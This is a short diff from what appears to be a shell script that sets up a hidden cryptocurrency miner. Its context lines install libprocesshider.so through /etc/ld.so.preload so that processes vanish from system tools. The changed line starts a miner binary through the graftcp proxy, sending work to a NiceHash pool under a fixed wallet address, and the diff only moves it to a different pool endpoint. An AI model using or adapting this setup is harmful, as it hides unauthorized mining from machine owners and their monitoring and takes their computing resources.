@@ -62,4 +62,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://3EFjw7CTQm1jzWK79yrXxW33nTfw8ZFdSV@daggerhashimoto.usa-east.nicehash.com:33353 --par ProgPoW --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=ssl://3EFjw7CTQm1jzWK79yrXxW33nTfw8ZFdSV@kawpow.auto.nicehash.com:443 --par ProgPoW --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
